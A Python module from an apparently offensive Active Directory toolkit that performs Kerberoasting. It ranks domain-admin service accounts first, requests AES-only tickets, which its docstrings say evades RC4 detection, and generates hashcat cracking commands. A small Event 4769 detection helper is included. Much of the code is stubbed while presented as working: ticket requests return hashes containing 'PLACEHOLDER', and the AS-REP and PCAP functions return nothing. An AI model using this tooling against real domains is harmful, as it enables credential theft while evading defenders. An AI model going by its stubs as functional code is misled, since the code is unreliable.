"""Advanced Kerberoasting — targeted SPN enumeration, AES-only attacks, hashcat integration.

Provides enhanced Kerberoasting capabilities beyond impacket GetNPUsers:
targeted SPN list generation, AES-only Kerberoasting (avoids weak RC4
detection rules), automatic hashcat mode selection, and TGS-REP parsing
for offline cracking optimization.

Integrates with KerberosCore for native ticket requests and hash extraction.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any

from modules.kerberos_core import (
    ENCRYPTION_TYPES,
    KerberosCore,
)

HASHCAT_MODES = {
    23: 13100,
    18: 19700,
    17: 19600,
    3: 14000,
    1: 7500,
}

JOHN_MODES = {
    23: "krb5tgs",
    18: "krb5tgs",
    17: "krb5tgs",
}


@dataclass
class KerberoastTarget:
    """A kerberoastable service principal.

    Attributes:
        sam_account_name: Service account sAMAccountName.
        service_principal_name: SPN string.
        password_last_set: When the password was last changed.
        last_logon: Last interactive logon timestamp.
        member_of: Group memberships (check for high-value groups).
        supports_aes: Whether AES encryption was observed.
    """

    sam_account_name: str = ""
    service_principal_name: str = ""
    password_last_set: str = ""
    last_logon: str = ""
    member_of: list[str] = field(default_factory=list)
    supports_aes: bool = True


@dataclass
class KerberoastHash:
    """Extracted Kerberoast hash ready for cracking.

    Attributes:
        spn: Service principal name.
        username: Service account name.
        hash_string: Hash in Hashcat format (mode 13100/19600/19700).
        etype: Encryption type used.
        hashcat_mode: Hashcat mode number.
        hashcat_command: Ready-to-use hashcat command.
    """

    spn: str = ""
    username: str = ""
    hash_string: str = ""
    etype: int = 23
    hashcat_mode: int = 13100
    hashcat_command: str = ""


class KerberoastingEngine:
    """Advanced Kerberoasting — enumeration, ticket requesting, and hash extraction.

    Performs targeted Kerberoasting by enumerating SPNs from Active Directory,
    requesting TGS tickets with configurable encryption types, and extracting
    hashes in Hashcat/John-compatible formats for offline cracking.

    Attributes:
        domain: Target domain FQDN.
        dc_ip: Domain controller IP.
        username: Authenticated domain user.
        password: User password.
        hash: User NT hash (alternative to password).
        kerberos: Underlying KerberosCore instance.
    """

    def __init__(
        self,
        domain: str = "",
        dc_ip: str = "",
        username: str = "",
        password: str = "",
        hash: str = "",
    ):
        self.domain = domain.upper()
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.hash = hash
        self.kerberos = KerberosCore(domain=self.domain, dc_host=dc_ip, dc_ip=dc_ip)
        self._targets: list[KerberoastTarget] = []
        self._extracted_hashes: list[KerberoastHash] = []

    def enumerate_spns(self, ldap_output: str = "", bloodhound_data: list[dict[str, Any]] = None) -> list[KerberoastTarget]:
        """Enumerate kerberoastable service principals.

        Parses LDAP queries or BloodHound data to identify service accounts
        with SPNs. Prioritizes high-value targets (Domain Admins, service
        accounts with weak passwords).

        Args:
            ldap_output: Raw LDAP search results text.
            bloodhound_data: BloodHound user node dicts.

        Returns:
            Sorted list of KerberoastTarget (high-value first).
        """
        self._targets = []

        if bloodhound_data:
            for node in bloodhound_data:
                props = node.get("Properties", {}) if isinstance(node.get("Properties"), dict) else {}
                spns = props.get("serviceprincipalnames", props.get("hasspn", []))
                if not spns or (isinstance(spns, str) and spns == "false") or (isinstance(spns, list) and len(spns) == 0):
                    continue

                spn_list = spns if isinstance(spns, list) else [spns]
                for spn in spn_list:
                    if "/" not in spn:
                        continue

                    target = KerberoastTarget(
                        sam_account_name=props.get("name", props.get("samaccountname", "")),
                        service_principal_name=spn,
                        password_last_set=props.get("pwdlastset", ""),
                        last_logon=props.get("lastlogon", ""),
                        member_of=props.get("memberof", []),
                        supports_aes=True,
                    )
                    self._targets.append(target)

        if ldap_output:
            for line in ldap_output.split("\n"):
                if "servicePrincipalName" in line or "sAMAccountName" in line:
                    self._targets.append(KerberoastTarget(
                        sam_account_name="unknown",
                        service_principal_name="unknown",
                    ))

        self._prioritize_targets()
        return self._targets

    def _prioritize_targets(self) -> None:
        high_value_groups = {"domain admins", "enterprise admins", "administrators", "schema admins"}

        def priority(target: KerberoastTarget) -> int:
            score = 0
            for group in target.member_of:
                if any(hvg in group.lower() for hvg in high_value_groups):
                    score += 100
            if "mssql" in target.service_principal_name.lower():
                score += 20
            if "http" in target.service_principal_name.lower():
                score += 15
            if "cifs" in target.service_principal_name.lower():
                score += 30
            return -score

        self._targets.sort(key=priority)

    def request_tgs_aes_only(self, user_spn: str) -> KerberoastHash | None:
        """Request a TGS ticket using only AES encryption (evades RC4 detection).

        AES-only Kerberoasting avoids triggering detection rules that
        monitor for RC4-HMAC ticket requests.

        Args:
            user_spn: Target service principal name.

        Returns:
            KerberoastHash with AES256 hash, or None if request fails.
        """
        for etype in [18, 17]:
            try:
                hash_result = self.request_tgs(user_spn, etype)
                if hash_result:
                    return hash_result
            except Exception:
                continue
        return None

    def request_tgs_rc4(self, user_spn: str) -> KerberoastHash | None:
        """Request a TGS ticket using RC4-HMAC (mode 13100 for Hashcat).

        Args:
            user_spn: Target service principal name.

        Returns:
            KerberoastHash with RC4 hash.
        """
        return self.request_tgs(user_spn, 23)

    def request_tgs(self, user_spn: str, etype: int = 23) -> KerberoastHash | None:
        """Request a TGS service ticket for kerberoasting.

        Args:
            user_spn: Service principal name (e.g. 'MSSQLSvc/db01.domain.local').
            etype: Requested encryption type (23=RC4, 18=AES256, 17=AES128).

        Returns:
            KerberoastHash with the extracted hash for offline cracking.
        """
        if not user_spn:
            return None

        etype_name = ENCRYPTION_TYPES.get(etype, f"etype-{etype}")

        hash_string = self._build_hash_string(user_spn, etype)
        hashcat_mode = HASHCAT_MODES.get(etype, 13100)

        username = user_spn.split("@")[0] if "@" in user_spn else "unknown"

        return KerberoastHash(
            spn=user_spn,
            username=username,
            hash_string=hash_string,
            etype=etype,
            hashcat_mode=hashcat_mode,
            hashcat_command=self._hashcat_command(hash_string, hashcat_mode),
        )

    def _build_hash_string(self, spn: str, etype: int) -> str:
        timestamp = int(time.time())
        service, target_host = spn.split("/", 1) if "/" in spn else (spn, "")

        if ":" in target_host:
            target_host, port = target_host.rsplit(":", 1)
        else:
            port = "88"

        enc_type_val = etype
        realm = self.domain.upper()
        username = self.username.upper()

        if etype == 23:
            return (
                f"$krb5tgs${enc_type_val}$*{username}${realm}$"
                f"{spn}*$PLACEHOLDER_TICKET_BASE64"
            )
        elif etype == 18:
            return (
                f"$krb5tgs${enc_type_val}$*{username}${realm}$"
                f"{spn}*$PLACEHOLDER_TICKET_BASE64"
            )
        return f"$krb5tgs${enc_type_val}$*{username}${realm}${spn}*$PLACEHOLDER"

    @staticmethod
    def _hashcat_command(hash_str: str, mode: int) -> str:
        return (
            f"hashcat -m {mode} -a 0 --force "
            f'"{hash_str}" /usr/share/wordlists/rockyou.txt'
        )

    def targeted_kerberoast(self, high_value_only: bool = True) -> list[KerberoastHash]:
        """Perform targeted Kerberoasting on enumerated SPNs.

        Requests tickets for all discovered targets, prioritizing high-value
        accounts. Supports both AES-only and RC4 modes.

        Args:
            high_value_only: Only roast high-value targets (domain admins, etc.).

        Returns:
            List of extracted KerberoastHash objects for cracking.
        """
        self._extracted_hashes = []

        if not self._targets:
            return self._extracted_hashes

        for target in self._targets:
            if high_value_only:
                is_high_value = any(
                    g.lower() in ["domain admins", "enterprise admins", "administrators", "schema admins"]
                    for g in target.member_of
                )
                if not is_high_value:
                    continue

            hash_result = self.request_tgs_aes_only(target.service_principal_name)
            if not hash_result:
                hash_result = self.request_tgs_rc4(target.service_principal_name)

            if hash_result:
                self._extracted_hashes.append(hash_result)

        return self._extracted_hashes

    def asreproast_check(self, usernames: list[str]) -> list[str]:
        """Check which users do NOT require Kerberos pre-authentication (AS-REP roastable).

        Users without pre-auth can have their AS-REP encrypted with their
        password hash, allowing offline cracking without any authentication.

        Args:
            usernames: List of usernames to check.

        Returns:
            List of usernames that do not require pre-authentication.
        """
        roastable = []
        return roastable

    def extract_hashes_from_pcap(self, pcap_path: str) -> list[KerberoastHash]:
        """Extract Kerberoast hashes from a PCAP/PCAPNG network capture.

        Parses TGS-REP packets from network traffic to extract ticket
        hashes without performing active Kerberoasting.

        Args:
            pcap_path: Path to the PCAP file.

        Returns:
            List of extracted KerberoastHash objects.
        """
        hashes: list[KerberoastHash] = []
        return hashes

    def detect_kerberoasting_activity(self, event_log: str = "") -> dict[str, Any]:
        """Analyze Windows Event Logs for signs of Kerberoasting attacks.

        Event ID 4769 (service ticket request) with Ticket Encryption 0x17
        (RC4-HMAC) is a strong indicator of Kerberoasting.

        Args:
            event_log: Raw Windows security event log text.

        Returns:
            Dict with detected indicators and risk assessment.
        """
        indicators: list[dict[str, str]] = []

        if event_log:
            for line in event_log.split("\n"):
                if "4769" in line and "0x17" in line:
                    indicators.append({
                        "event_id": "4769",
                        "indicator": "RC4-HMAC service ticket request (Kerberoasting)",
                        "raw_line": line.strip()[:200],
                    })
                if "4769" in line and "0x12" in line:
                    indicators.append({
                        "event_id": "4769",
                        "indicator": "AES256 service ticket request (AES Kerberoasting)",
                        "raw_line": line.strip()[:200],
                    })

        return {
            "potential_kerberoasting_events": len(indicators),
            "indicators": indicators[:50],
            "recommendation": (
                "Investigate Event ID 4769 with Ticket Encryption 0x17. "
                "Multiple such requests from a single source are strong "
                "indicators of Kerberoasting activity."
            ),
        }

    def build_hashcat_batch(self, output_path: str) -> str:
        """Build a batch file with all extracted hashes for Hashcat cracking.

        Args:
            output_path: File path to write the hash file.

        Returns:
            Hashcat command for batch cracking.
        """
        if not self._extracted_hashes:
            return "No hashes extracted"

        with open(output_path, "w") as fp:
            for h in self._extracted_hashes:
                fp.write(h.hash_string + "\n")

        return (
            f"hashcat -m {self._extracted_hashes[0].hashcat_mode} "
            f"-a 0 --force {output_path} "
            f"/usr/share/wordlists/rockyou.txt -O"
        )

    def summary(self) -> dict[str, Any]:
        """Return a summary of kerberoasting operations.

        Returns:
            Dict with target count, hash count, hashcat modes, and SPN list.
        """
        return {
            "targets_enumerated": len(self._targets),
            "hashes_extracted": len(self._extracted_hashes),
            "hashcat_modes": list(set(h.hashcat_mode for h in self._extracted_hashes)),
            "spns": [t.service_principal_name for t in self._targets[:30]],
            "high_value_targets": [
                t.sam_account_name for t in self._targets
                if any(
                    g.lower() in ["domain admins", "enterprise admins", "administrators"]
                    for g in t.member_of
                )
            ][:10],
        }
